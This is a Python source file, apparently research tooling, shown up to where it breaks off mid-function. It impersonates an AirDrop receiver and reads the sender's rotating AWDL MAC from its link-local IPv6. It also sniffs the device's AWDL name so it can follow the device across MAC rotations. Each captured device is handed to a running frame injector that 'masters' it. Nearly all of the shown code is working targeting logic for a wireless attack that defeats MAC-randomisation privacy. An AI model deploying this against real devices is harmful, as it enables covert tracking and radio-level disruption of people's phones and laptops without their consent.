#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
"""Make this PC an AirDrop target and feed the sender's identity to the injector.

Companion to ``awdl_master_inject.py``.  It advertises an AirDrop receiver over
the ``awdl0`` interface (which the OWL daemon brings up); when an Apple device
picks this PC on its share sheet and sends a file, the sender's **current AWDL
MAC** is recovered from the link-local IPv6 of the incoming HTTPS connection and
handed -- live, with no restart -- to the running injector as its target.  So
you never have to look up the device's rotating MAC by hand again.

Where possible it also resolves the device's **AWDL name / UUID** (the Arpa TLV
it broadcasts) by sniffing on the monitor card, and tracks *that* instead of the
MAC, so the injector keeps following the device across every MAC rotation --
between sends, not only when a new file arrives.

Pipeline (one process)::

    AirDrop send  ->  /Ask HTTPS request  ->  capture sender IPv6 (+ identity)
                  ->  IPv6 -> current AWDL MAC  (reverse EUI-64 / `ip neigh`)
                  ->  MAC -> AWDL UUID          (sniffed MIFs, optional)
                  ->  HostnameTracker.add_target(uuid, mac)  (live retarget)
                  ->  awdl_master_inject keeps mastering the device

How identity is recovered (per OWL/OpenDrop, see tools/README.md):

* OWL creates ``awdl0`` and installs each peer's MAC<->link-local IPv6 mapping
  (RFC 4291 modified EUI-64) into the kernel neighbor table as NUD_PERMANENT.
* An inbound IPv6 connection exposes the peer as ``(host, port, flowinfo,
  scope_id)``; ``host`` is the sender's ``fe80::`` address derived from its
  current (randomised) AWDL MAC, ``scope_id`` is awdl0's interface index.
* The MAC is read back either from ``ip -6 neigh show dev awdl0`` (authoritative)
  or by reversing the modified-EUI-64 interface identifier.

Backends for the receiver itself:

* ``builtin`` -- a self-contained AirDrop receiver using only the standard
  library (plus ``cryptography`` or ``openssl`` for the self-signed cert, and
  ``zeroconf`` or ``avahi``/``dns-sd`` for the mDNS advertisement).
* ``opendrop`` -- if the SEEMOO ``opendrop`` package is installed, it is used as
  the receiver engine and hooked for capture (highest protocol fidelity).

Requirements: Linux, Python 3.6+, **root**, the OWL daemon running (so ``awdl0``
exists with a link-local IPv6), and -- for UUID resolution and for the injector
itself -- a Wi-Fi card in monitor mode.

    sudo owl -i wlan0                      # bring up awdl0 (separate daemon)
    sudo ./airdrop_target.py -i wlan0 --channels 6,6,44,149 --channel-dwell 300ms

Then, on the Apple device, set AirDrop to "Everyone" (for 10 minutes), open the
share sheet, pick this PC, and send any file.  The injector immediately locks
onto whichever device just sent.

AUTHORISED USE ONLY.  Like the rest of OWL this is experimental research
software; run it only against devices you own or are explicitly authorised to
test, in an isolated RF lab.
"""

import argparse
import gzip
import http.server
import ipaddress
import os
import plistlib
import socket
import ssl
import subprocess
import sys
import threading
import time

# The injector is imported as a module: we drive its live ParamStore /
# HostnameTracker rather than shelling out, so a captured target retargets the
# running injection with no restart.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import awdl_master_inject as awdl   # noqa: E402


# ---------------------------------------------------------------------------
# AirDrop / mDNS constants (kept in sync with OpenDrop opendrop/{server,config}.py)
# ---------------------------------------------------------------------------

AIRDROP_SERVICE_TYPE = "_airdrop._tcp.local."
AIRDROP_DEFAULT_PORT = 8771
# flags TXT record = SUPPORTS_MIXED_TYPES (0x08) | SUPPORTS_DISCOVER_MAYBE (0x80)
AIRDROP_FLAGS = 0x08 | 0x80           # == 136, what OpenDrop advertises
RECEIVER_MEDIA_CAPABILITIES = b'{"Version":1}'   # UTF-8 JSON *bytes* in the plist
DEFAULT_AWDL_IFACE = "awdl0"

# How long a resolved AWDL name is trusted when we look it up for a captured MAC.
OBSERVER_MAX_AGE = 30.0
# Suppress duplicate captures of the same (mac, kind) within this window so a
# burst of /Discover requests does not spam the log / re-apply the same target.
CAPTURE_DEDUP_WINDOW = 2.0


# ---------------------------------------------------------------------------
# IPv6 (awdl0 link-local) <-> MAC
# ---------------------------------------------------------------------------

def ll_to_mac(addr):
    """Reverse an awdl0 modified-EUI-64 link-local IPv6 to a 6-byte MAC.

    ``addr`` may carry a ``%scope`` suffix.  Raises ``ValueError`` when the
    interface identifier is not EUI-64 (no ``ff:fe`` marker), e.g. an RFC 4941
    / RFC 7217 privacy address -- callers then fall back to the neighbor table.

    Mirrors OWL's forward transform ``rfc4291_addr`` (daemon/netutils.c): the
    first octet's U/L bit (0x02) is flipped and ``ff:fe`` is removed from the
    middle.  Verified: ``fe80::64aa:30ff:fe33:93af`` -> ``66:aa:30:33:93:af``.
    """
    bare = str(addr).split("%", 1)[0]
    iid = ipaddress.IPv6Address(bare).packed[8:]      # low 64 bits
    if iid[3] != 0xFF or iid[4] != 0xFE:
        raise ValueError("not a modified-EUI-64 interface id: %s" % addr)
    return bytes([iid[0] ^ 0x02, iid[1], iid[2], iid[5], iid[6], iid[7]])


def mac_to_ll(mac):
    """Forward transform: 6-byte MAC -> ``fe80::`` modified-EUI-64 address str."""
    b = bytes(mac)
    iid = bytes([b[0] ^ 0x02, b[1], b[2], 0xFF, 0xFE, b[3], b[4], b[5]])
    return str(ipaddress.IPv6Address(b"\xfe\x80" + b"\x00" * 6 + iid))


def parse_neigh_output(text):
    """Parse ``ip -6 neigh show dev <dev>`` output into ``{ipv6_str: mac_str}``.

    Handles the dev-filtered form (no trailing ``dev <iface>`` column) and skips
    INCOMPLETE/FAILED entries that carry no ``lladdr``.
    """
    table = {}
    for line in text.splitlines():
        fields = line.split()
        if not fields:
            continue
        ip = fields[0].split("%", 1)[0]
        mac = None
        i = 1
        while i < len(fields):
            tok = fields[i]
            if tok == "lladdr" and i + 1 < len(fields):
                mac = fields[i + 1].lower()
                i += 2
                continue
            i += 1
        if mac:
            table[ip] = mac
    return table


def neigh_lookup(ipv6, iface):
    """Authoritative MAC for ``ipv6`` from the kernel neighbor table (OWL keeps
    it populated as NUD_PERMANENT), or ``None`` if unavailable / not present."""
    if not awdl.shutil.which("ip"):
        return None
    try:
        out = subprocess.run(["ip", "-6", "neigh", "show", "dev", iface],
                             capture_output=True, text=True, timeout=5).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    return parse_neigh_output(out).get(str(ipv6).split("%", 1)[0])


def resolve_peer_mac(ipv6, iface):
    """Resolve a peer link-local IPv6 (on ``iface``) to its 6-byte MAC.

    Prefers the kernel neighbor table (authoritative, derivation-independent)
    and falls back to reversing the modified-EUI-64 interface id.  Returns the
    MAC as 6 bytes, or ``None`` if neither method yields one.
    """
    mac_str = neigh_lookup(ipv6, iface)
    if mac_str:
        try:
            return awdl.parse_mac(mac_str)
        except argparse.ArgumentTypeError:
            pass
    try:
        return ll_to_mac(ipv6)
    except ValueError:
        return None


def _select_linklocal(lines, iface):
    """Pick ``iface``'s ``fe80::`` address from ``/proc/net/if_inet6`` lines,
    preferring a link-local one; falls back to any address on the iface.
    Returns a str or ``None``.  (Pure, for testability.)"""
    best = None
    for line in lines:
        parts = line.split()
        if len(parts) < 6 or parts[5] != iface:
            continue
        addr = ipaddress.IPv6Address(bytes.fromhex(parts[0]))
        if addr.is_link_local:
            return str(addr)
        best = best or str(addr)
    return best


def iface_linklocal(iface, wait=0.0):
    """Return the ``fe80::`` link-local IPv6 of ``iface`` (str) or ``None``.

    Reads ``/proc/net/if_inet6`` -- no external tool needed -- so we can both
    verify OWL is up and bind the mDNS advertisement to the right address.
    With ``wait`` > 0, poll for up to that many seconds for the address to
    appear: the OWL daemon takes a moment after launch to create awdl0 and
    assign its link-local, so a receiver started right after ``owl`` would
    otherwise race it.
    """
    deadline = time.monotonic() + wait
    while True:
        try:
            with open("/proc/net/if_inet6") as fh:
                lines = fh.read().splitlines()
        except OSError:
            lines = []
        addr = _select_linklocal(lines, iface)
        if addr is not None or time.monotonic() >= deadline:
            return addr
        time.sleep(0.5)


def iface_exists(iface):
    return os.path.exists("/sys/class/net/%s" % iface)


# ---------------------------------------------------------------------------
# AirDrop plist identity
# ---------------------------------------------------------------------------

class SenderIdentity:
    """Everything captured about one AirDrop sender at one request."""

    __slots__ = ("mac", "ipv6", "iface", "uuid", "sender_id",
                 "computer_name", "model", "files", "kind")

    def __init__(self, mac=None, ipv6=None, iface=None, uuid=None,
                 sender_id=None, computer_name=None, model=None,
                 files=(), kind=None):
        self.mac = mac                      # 6 bytes (current AWDL MAC) or None
        self.ipv6 = ipv6                    # peer link-local IPv6 str
        self.iface = iface                  # awdl0
        self.uuid = uuid                    # AWDL name / UUID (Arpa TLV) or None
        self.sender_id = sender_id          # AirDrop SenderID (12 hex) or None
        self.computer_name = computer_name  # SenderComputerName or None
        self.model = model                  # SenderModelName or None
        self.files = list(files)            # file names in the /Ask plist
        self.kind = kind                    # "discover" | "ask" | "upload"

    @property
    def mac_str(self):
        return awdl.mac_str(self.mac) if self.mac else "?"

    def describe(self):
        bits = ["MAC %s" % self.mac_str]
        if self.uuid:
            bits.append("uuid %s" % self.uuid)
        if self.computer_name:
            bits.append('name "%s"' % self.computer_name)
        if self.model:
            bits.append("model %s" % self.model)
        if self.sender_id:
            bits.append("airdrop-id %s" % self.sender_id)
        if self.files:
            bits.append("files %s" % ", ".join(self.files))
        return "  ".join(bits)


def parse_identity_plist(body):
    """Extract sender-identifying fields from an AirDrop /Ask (or /Discover)
    binary-plist body.  Defensive: returns ``{}`` on any parse error, and copes
    with modern senders adding/renaming keys."""
    out = {}
    try:
        p = plistlib.loads(body)
    except Exception:
        return out
    if not isinstance(p, dict):
        return out
    out["sender_id"] = p.get("SenderID")
    out["computer_name"] = p.get("SenderComputerName")
    out["model"] = p.get("SenderModelName")
    files = []
    for entry in (p.get("Files") or []):
        if isinstance(entry, dict) and entry.get("FileName"):
            files.append(str(entry["FileName"]))
    out["files"] = files
    return out


# ---------------------------------------------------------------------------
# passive AWDL observer: current MAC -> AWDL name (UUID) map
# ---------------------------------------------------------------------------

class MacNameObserver:
    """Sniff AWDL frames on the monitor card and keep a ``MAC -> AWDL name`` map.

    Runs on its own passive RX socket (a second ``AF_PACKET`` socket on the same
    monitor interface receives its own copy of every frame, so it does not
    disturb the injector's socket).  Used to turn a captured MAC into the
    device's AWDL name / UUID, which is the stable-ish handle the injector can
    follow across MAC rotations.
    """

    def __init__(self, iface):
        self.iface = iface
        self._map = {}                # mac(bytes) -> (name, monotonic_seen)
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._sock = None
        self._thread = None

    def start(self):
        try:
            self._sock = awdl.open_injection_socket(self.iface)
        except (SystemExit, OSError) as exc:   # needs root / monitor iface
            print("[airdrop] UUID resolution disabled (%s)" % exc)
            return False
        self._thread = threading.Thread(target=self._run, name="awdl-observer",
                                        daemon=True)
        self._thread.start()
        return True

    def _run(self):
        while not self._stop.is_set():
            try:
                buf = self._sock.recv(4096)
            except (socket.timeout, OSError):
                continue
            info = awdl.parse_awdl_info(buf)
            if info is None:
                continue
            src, hostname, _maddr, _sctr = info
            if hostname:
                with self._lock:
                    self._map[bytes(src)] = (hostname, time.monotonic())

    def name_for(self, mac, wait=0.0):
        """Most recently observed AWDL name for ``mac`` (bytes), or ``None``.

        With ``wait`` > 0, block up to that many seconds for a first sighting --
        useful right after a capture if the device has not been heard yet.
        """
        mac = bytes(mac)
        deadline = time.monotonic() + wait
        while True:
            with self._lock:
                hit = self._map.get(mac)
            if hit and (time.monotonic() - hit[1]) <= OBSERVER_MAX_AGE:
                return hit[0]
            if time.monotonic() >= deadline:
                return None
            time.sleep(0.1)

    def stop(self):
        self._stop.set()
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass


# ---------------------------------------------------------------------------
# capture bridge: identity -> live injector retarget
# ---------------------------------------------------------------------------

class CaptureBridge:
    """Turn a captured sender into a live injector target.

    Owns the single :class:`HostnameTracker` that writes ``store['targets']``:
    a captured device with a resolvable AWDL name is tracked by name (so MAC
    rotation is followed automatically); one without is pinned by its current
    MAC.  ``store`` and the tracker are shared with the injector thread.
    """

    def __init__(self, store, tracker, observer=None, awdl_iface=DEFAULT_AWDL_IFACE,
                 inject=True, resolve_wait=2.0, on_capture=None, monitor_iface=None,
                 arm_event=None, arm_on_capture=True, arm_after="upload"):
        self.store = store
        self.tracker = tracker
        self.observer = observer
        self.awdl_iface = awdl_iface
        self.inject = inject
        self.resolve_wait = resolve_wait
        self.on_capture = on_capture
        self.monitor_iface = monitor_iface
        # Arming: when arm_on_capture, the injector is started the first time an
        # ``arm_after`` request is seen.  arm_after defaults to "upload", i.e.
        # we wait until the AirDrop FILE TRANSFER has completed before injecting,
        # so the Discover/Ask/Upload exchange runs on a radio owl owns alone --
        # otherwise the injector starves owl mid-upload, the transfer fails, and
        # iOS stops showing a receiver whose sends keep failing.  With
        # ``--decline`` there is no upload, so arm_after is "ask".  In trigger
        # mode arm_on_capture is False and targets just accumulate until the
        # external arm.
        self.arm_event = arm_event
        self.arm_on_capture = arm_on_capture
        self.arm_after = arm_after
        self._last = {}               # (mac, kind) -> monotonic, for de-dup
        self._lock = threading.Lock()

    def on_request(self, peer_ip, scope_id, kind, plist_body=None):
        """Called by a receiver backend for each captured request.

        ``peer_ip`` is the bare link-local IPv6, ``scope_id`` the interface
        index.  Returns the :class:`SenderIdentity` (or ``None`` if the MAC
        could not be resolved).
        """
        iface = self.awdl_iface
        if scope_id:
            try:
                iface = socket.if_indextoname(scope_id)
            except OSError:
                iface = self.awdl_iface

        mac = resolve_peer_mac(peer_ip, iface)
        ident = SenderIdentity(mac=mac, ipv6=peer_ip, iface=iface, kind=kind)
        if plist_body:
            app = parse_identity_plist(plist_body)
            ident.sender_id = app.get("sender_id")
            ident.computer_name = app.get("computer_name")
            ident.model = app.get("model")
            ident.files = app.get("files", [])

        if mac is None:
            print("[airdrop] %s from %s on %s -- could not resolve a MAC "
                  "(not EUI-64 and not in `ip neigh`)" % (kind, peer_ip, iface))
            return None

        # De-duplicate bursts of the same request kind from the same device.
        now = time.monotonic()
        with self._lock:
            prev = self._last.get((mac, kind))
            self._last[(mac, kind)] = now
        if prev is not None and (now - prev) < CAPTURE_DEDUP_WINDOW:
            return ident

        if self.observer is not None:
            ident.uuid = self.observer.name_for(mac, wait=self.resolve_wait)

        self._apply(ident)
        print("[airdrop] captured %s via %s" % (ident.describe(), kind))
        if not self.inject:
            print("          injector command: %s" % self.injector_command(ident))
        # Arm the (deferred) injector once the chosen request kind is seen --
        # by default "upload", i.e. only after the file transfer has finished,
        # so we never disrupt the AirDrop exchange itself.
        if (self.arm_on_capture and kind == self.arm_after
                and self.arm_event is not None and not self.arm_event.is_set()):
            self.arm_event.set()
            print("[airdrop] armed -- injector now sending (transfer complete)")
        if self.on_capture is not None:
            try:
                self.on_capture(ident)
            except Exception as exc:                       # never kill the server
                print("[airdrop] on_capture callback error: %s" % exc)
        return ident

    def _apply(self, ident):
        """Retarget the live injection at the captured device."""
        if not self.inject:
            return
        if ident.uuid:
            # Track by name: follows the device across MAC rotation from now on,
            # seeded with the current MAC so injection retargets immediately.
            self.tracker.add_target(ident.uuid, ident.mac)
        else:
            # No resolvable name -- pin the current MAC.  A later capture that
            # does resolve a UUID upgrades this device to name-tracking.
            self.tracker.add_fixed(ident.mac)

    def injector_command(self, ident):
        """The equivalent standalone ``awdl_master_inject.py`` invocation (for
        --no-inject mode, so the user can run the injector by hand)."""
        mon = self.monitor_iface or "wlan0"
        cmd = ["sudo", "./awdl_master_inject.py", "-i", mon]
        if ident.uuid:
            cmd += ["--track", ident.uuid]
        else:
            cmd += ["-t", ident.mac_str]
        return " ".join(cmd)


# ---------------------------------------------------------------------------
# self-signed TLS certificate
# ---------------------------------------------------------------------------

def ensure_selfsigned_cert(cert_dir, common_name):
    """Return ``(cert_path, key_path)`` for a self-signed cert in ``cert_dir``,
    generating one if absent.  Uses the ``cryptography`` module if available,
    else shells out to ``openssl``.  AirDrop receivers present a self-signed
    cert and the sender does not validate it in "Everyone" mode."""
    os.makedirs(cert_dir, exist_ok=True)
    cert_path = os.path.join(cert_dir, "certificate.pem")
    key_path = os.path.join(cert_dir, "key.pem")
    if os.path.exists(cert_path) and os.path.exists(key_path):
        return cert_path, key_path

    try:
        _gen_cert_cryptography(cert_path, key_path, common_name)
        return cert_path, key_path
    except Exception:
        pass

    openssl = awdl.shutil.which("openssl")
    if not openssl:
        raise RuntimeError(
            "no way to create a TLS certificate: install the 'cryptography' "
            "Python module or the 'openssl' CLI")
    subprocess.run(
        [openssl, "req", "-newkey", "rsa:2048", "-nodes", "-keyout", key_path,
         "-x509", "-days", "3650", "-out", cert_path, "-subj",
         "/CN=%s" % common_name],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return cert_path, key_path


def _gen_cert_cryptography(cert_path, key_path, common_name):
    import datetime
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .sign(key, hashes.SHA256()))
    with open(key_path, "wb") as fh:
        fh.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()))
    with open(cert_path, "wb") as fh:
        fh.write(cert.public_bytes(serialization.Encoding.PEM))


def airdrop_ssl_context(cert_path, key_path):
    """A server TLS context matching AirDrop: self-signed cert, no client-cert
    request (so an "Everyone"-mode sender completes the handshake)."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    except (AttributeError, ValueError):
        pass
    ctx.verify_mode = ssl.CERT_NONE        # do not request/verify a client cert
    ctx.check_hostname = False
    ctx.load_cert_chain(cert_path, keyfile=key_path)
    return ctx


# ---------------------------------------------------------------------------
# built-in AirDrop receiver (stdlib)
# ---------------------------------------------------------------------------

def _read_chunked_body(rfile):
    """Read an HTTP/1.1 ``Transfer-Encoding: chunked`` body and return the raw
    bytes (the AirDrop /Upload payload: a gzip-compressed cpio archive)."""
    parts = []
    while True:
        size_line = rfile.readline()
        if not size_line:
            break
        size_line = size_line.split(b";", 1)[0].strip()
        try:
            size = int(size_line, 16)
        except ValueError:
            break
        if size == 0:
            rfile.readline()               # trailing CRLF
            break
        parts.append(rfile.read(size))
        rfile.readline()                   # CRLF after each chunk
    return b"".join(parts)


def _save_upload(raw, download_dir):
    """Best-effort: decompress the gzip'd cpio and save the archive (and, when
    possible, the extracted files) under ``download_dir``.  Never raises."""
    if not download_dir:
        return
    try:
        os.makedirs(download_dir, exist_ok=True)
        stamp = int(time.time())
        data = raw
        if raw[:2] == b"\x1f\x8b":                      # gzip magic
            try:
                data = gzip.decompress(raw)
            except OSError:
                data = raw
        archive = os.path.join(download_dir, "airdrop_%d.cpio" % stamp)
        with open(archive, "wb") as fh:
            fh.write(data)
        names = _extract_cpio_newc(data, download_dir)
        if names:
            print("[airdrop] received file(s): %s" % ", ".join(names))
        else:
            print("[airdrop] saved raw archive %s (extract with: cpio -idv < %s)"
                  % (archive, archive))
    except Exception as exc:
        print("[airdrop] could not save upload: %s" % exc)


def _extract_cpio_newc(data, dest):
    """Minimal 'newc' cpio extractor (the format AirDrop uses).  Returns the
    list of extracted regular-file names, or ``[]`` if the format is not newc."""
    names = []
    off = 0
    MAGIC = b"070701"
    while off + 110 <= len(data):
        if data[off:off + 6] != MAGIC:
            break
        def field(i):
            return int(data[off + 6 + i * 8: off + 6 + i * 8 + 8], 16)
        mode = field(1)
        filesize = field(6)
        namesize = field(11)
        name_off = off + 110
        name = data[name_off:name_off + namesize - 1].decode("utf-8", "replace")
        header_pad = (-(110 + namesize)) % 4
        file_off = name_off + namesize + header_pad
        if name == "TRAILER!!!":
            break
        file_data = data[file_off:file_off + filesize]
        is_dir = (mode & 0o170000) == 0o040000
        safe = os.path.normpath(name).lstrip("./")
        if safe and not safe.startswith("..") and not os.path.isabs(safe):
            target = os.path.join(dest, safe)
            if is_dir:
                os.makedirs(target, exist_ok=True)
            else:
                os.makedirs(os.path.dirname(target) or dest, exist_ok=True)
                with open(target, "wb") as fh:
                    fh.write(file_data)
                names.append(safe)
        off = file_off + filesize + ((-filesize) % 4)
    return names


class AirDropHTTPServer(http.server.ThreadingHTTPServer):
    """IPv6, TLS-wrapped, threaded AirDrop receiver HTTP server."""

    address_family = socket.AF_INET6
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, server_address, handler, ssl_ctx):
        super().__init__(server_address, handler)
        self.socket = ssl_ctx.wrap_socket(self.socket, server_side=True)

    def handle_error(self, request, client_address):
        # TLS probes / senders that close early raise here; keep it quiet.
        pass


class AirDropHandler(http.server.BaseHTTPRequestHandler):
    """Handles the sender's Discover / Ask / Upload requests and captures it."""

    protocol_version = "HTTP/1.1"
    bridge = None                 # CaptureBridge (set before serving)
    receiver_name = "OWL"
    receiver_model = "OpenDrop"
    trigger = "ask"               # "ask" | "discover" | "both"
    download_dir = None
    decline = False               # if True, decline the transfer after capture

    # -- helpers ----------------------------------------------------------
    def _plist_response(self, obj, status=200):
        body = plistlib.dumps(obj, fmt=plistlib.FMT_BINARY)
        self.send_response(status)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            n = 0
        return self.rfile.read(n) if n else b""

    def _capture(self, kind, body=None):
        if self.bridge is None:
            return
        host = self.client_address[0]
        scope = self.client_address[3] if len(self.client_address) > 3 else 0
        try:
            self.bridge.on_request(host, scope, kind, body)
        except Exception as exc:
            print("[airdrop] capture error: %s" % exc)

    # -- routes -----------------------------------------------------------
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", "1")
        self.end_headers()
        self.wfile.write(b"\n")

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self):
        path = self.path
        if path == "/Discover":
            body = self._read_body()
            if self.trigger in ("discover", "both"):
                self._capture("discover", body)
            self._plist_response({
                "ReceiverComputerName": self.receiver_name,
                "ReceiverModelName": self.receiver_model,
                "ReceiverMediaCapabilities": RECEIVER_MEDIA_CAPABILITIES,
            })
        elif path == "/Ask":
            body = self._read_body()
            self._capture("ask", body)       # always capture the intent-to-send
            if self.decline:
                self._plist_response({}, status=403)
            else:
                self._plist_response({
                    "ReceiverModelName": self.receiver_model,
                    "ReceiverComputerName": self.receiver_name,
                })
        elif path == "/Upload":
            enc = (self.headers.get("Transfer-Encoding") or "").lower()
            raw = _read_chunked_body(self.rfile) if "chunked" in enc \
                else self._read_body()
            _save_upload(raw, self.download_dir)
            # Finish the HTTP transfer FIRST (so iOS sees a clean success), then
            # capture/arm -- arming the injector only now keeps the radio quiet
            # for the whole Discover/Ask/Upload exchange.
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.send_header("Connection", "close")
            self.end_headers()
            try:
                self.wfile.flush()
            except OSError:
                pass
            self._capture("upload")
        else:
            self.send_response(400)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def log_message(self, fmt, *args):
        pass                                 # quiet; captures print their own line


# ---------------------------------------------------------------------------
# mDNS advertisement
# ---------------------------------------------------------------------------

class MdnsAdvertiser:
    """Advertise ``_airdrop._tcp`` on awdl0 so a sender can discover us.

    Prefers the ``zeroconf`` library (what OpenDrop uses, bound to the awdl0
    link-local IPv6, V6-only); falls back to ``avahi-publish-service`` /
    ``dns-sd``; if none is available the receiver still runs but warns that a
    sender will not find it without an mDNS responder.
    """

    def __init__(self, ipv6, port, service_id, host_name, flags=AIRDROP_FLAGS):
        self.ipv6 = ipv6
        self.port = port
        self.service_id = service_id
        self.host_name = host_name
        self.flags = flags
        self._zc = None
        self._info = None
        self._proc = None

    def start(self):
        if self._start_zeroconf():
            print("[airdrop] mDNS: advertising %s._airdrop._tcp on %s:%d "
                  "(zeroconf)" % (self.service_id, self.ipv6, self.port))
            return True
        if self._start_subprocess():
            print("[airdrop] mDNS: advertising _airdrop._tcp on :%d (avahi/dns-sd)"
                  % self.port)
            return True
        print("[airdrop] WARNING: no mDNS responder (install python 'zeroconf' "
              "or avahi/dns-sd); a sender may not discover this target")
        return False

    def _start_zeroconf(self):
        try:
            from zeroconf import IPVersion, ServiceInfo, Zeroconf
        except Exception:
            return False
        try:
            self._zc = Zeroconf(interfaces=[self.ipv6], ip_version=IPVersion.V6Only)
            self._info = ServiceInfo(
                AIRDROP_SERVICE_TYPE,
                "%s.%s" % (self.service_id, AIRDROP_SERVICE_TYPE),
                port=self.port,
                properties={b"flags": str(self.flags).encode()},
                server="%s.local." % self.host_name,
                addresses=[ipaddress.IPv6Address(self.ipv6).packed],
            )
            self._zc.register_service(self._info)
            return True
        except Exception as exc:
            print("[airdrop] zeroconf failed (%s); trying avahi/dns-sd" % exc)
            self._zc = None
            return False

    def _start_subprocess(self):
        txt = "flags=%d" % self.flags
        if awdl.shutil.which("avahi-publish-service"):
            cmd = ["avahi-publish-service", self.service_id, "_airdrop._tcp",
                   str(self.port), txt]
        elif awdl.shutil.which("dns-sd"):
            cmd = ["dns-sd", "-R", self.service_id, "_airdrop._tcp", "local",
                   str(self.port), txt]
        else:
            return False
        try:
            self._proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                          stderr=subprocess.DEVNULL)
            return True
        except OSError:
            return False

    def stop(self):
        if self._zc is not None:
            try:
                self._zc.unregister_all_services()
                self._zc.close()
            except Exception:
                pass
        if self._proc is not None:
            self._proc.terminate()


# ---------------------------------------------------------------------------
# OpenDrop backend (optional)
# ---------------------------------------------------------------------------

def run_opendrop_receiver(bridge, awdl_iface, name, model, port, download_dir,
                          decline, trigger, stop):
    """Use an installed SEEMOO ``opendrop`` package as the receiver engine,
    hooking its handler to capture the sender.  Returns False if unavailable."""
    try:
        import opendrop.server as od
        from opendrop.config import AirDropConfig
    except Exception:
        return False

    _bridge = bridge

    def _hook(handler, kind):
        n = int(handler.headers.get("Content-Length") or 0)
        body = handler.rfile.read(n) if n else b""
        host = handler.client_address[0]
        scope = handler.client_address[3] if len(handler.client_address) > 3 else 0
        if kind == "ask" or (kind == "discover" and trigger in ("discover", "both")):
            try:
                _bridge.on_request(host, scope, kind, body)
            except Exception as exc:
                print("[airdrop] capture error: %s" % exc)
        return body

    base = od.AirDropServerHandler

    class CapturingHandler(base):
        def handle_discover(self):
            body = _hook(self, "discover")
            resp = plistlib.dumps({
                "ReceiverComputerName": self.config.computer_name,
                "ReceiverModelName": self.config.computer_model,
                "ReceiverMediaCapabilities": RECEIVER_MEDIA_CAPABILITIES,
            }, fmt=plistlib.FMT_BINARY)
            self._set_response(len(resp))
            self.wfile.write(resp)

        def handle_ask(self):
            _hook(self, "ask")
            if decline:
                self.send_response(403)
                self.send_header("Content-Length", 0)
                self.end_headers()
                return
            resp = plistlib.dumps({
                "ReceiverModelName": self.config.computer_model,
                "ReceiverComputerName": self.config.computer_name,
            }, fmt=plistlib.FMT_BINARY)
            self._set_response(len(resp))
            self.wfile.write(resp)

        def handle_upload(self):
            # Let OpenDrop receive the file fully first, then capture/arm, so the
            # transfer completes on a radio owl owns alone (same reason as the
            # builtin receiver -- a failed upload makes iOS hide the receiver).
            try:
                base.handle_upload(self)
            finally:
                host = self.client_address[0]
                scope = (self.client_address[3]
                         if len(self.client_address) > 3 else 0)
                try:
                    _bridge.on_request(host, scope, "upload", None)
                except Exception as exc:
                    print("[airdrop] capture error: %s" % exc)

    od.AirDropServerHandler = CapturingHandler
    if download_dir:
        os.makedirs(download_dir, exist_ok=True)
        os.chdir(download_dir)             # OpenDrop extracts into cwd

    cfg = AirDropConfig(interface=awdl_iface, computer_name=name,
                        computer_model=model)
    try:
        cfg.port = port
    except Exception:
        pass
    server = od.AirDropServer(cfg)
    server.start_service()
    t = threading.Thread(target=server.start_server, name="opendrop",
                         daemon=True)
    t.start()
    print("[airdrop] backend: opendrop (receiver up on awdl0:%d as '%s')"
          % (getattr(cfg, "port", port), name))
    stop.wait()
    try:
        server.stop()
    except Exception:
        pass
    return True


# ---------------------------------------------------------------------------
# orchestration
# ---------------------------------------------------------------------------

def run_airdrop_target(monitor_iface, awdl_iface=DEFAULT_AWDL_IFACE,
                       name=None, model="OpenDrop", port=AIRDROP_DEFAULT_PORT,
                       channels=None, channel_dwell=awdl.CHANNEL_DWELL_DEFAULT,
                       interval=1.0, counter_interval=awdl.MASTER_COUNTER_INTERVAL,
                       source=None, awdl_version=awdl.AWDL_VERSION_TLV_DEFAULT,
                       master_hostname="owl-master", devclass="macos",
                       metric=awdl.UINT32_MAX, counter=awdl.MASTER_COUNTER_BASE,
                       aw_offset=0, inject=True, resolve_uuid=True,
                       backend="auto", trigger="ask", decline=False,
                       download_dir=None, cert_dir=None, on_capture=None,
                       inject_start="capture", watch=False, psf=False, stop=None):
    """Run the AirDrop target (+ injector) until ``stop`` is set / Ctrl-C.

    Returns when stopped.  Captured senders are retargeted into the live
    injection via a shared ParamStore + HostnameTracker.
    """
    if stop is None:
        stop = threading.Event()
    name = name or socket.gethostname()

    ipv6 = iface_linklocal(awdl_iface, wait=10.0)
    if ipv6 is None:
        if iface_exists(awdl_iface):
            raise RuntimeError(
                "%s exists but has no link-local IPv6 (waited 10s). The OWL "
                "daemon may still be starting, may have exited, or "
                "NetworkManager may have stripped the address. Check:\n"
                "  ip addr show %s        (expect an 'inet6 fe80::...' line)\n"
                "  ps aux | grep -i owl   (owl must stay running)\n"
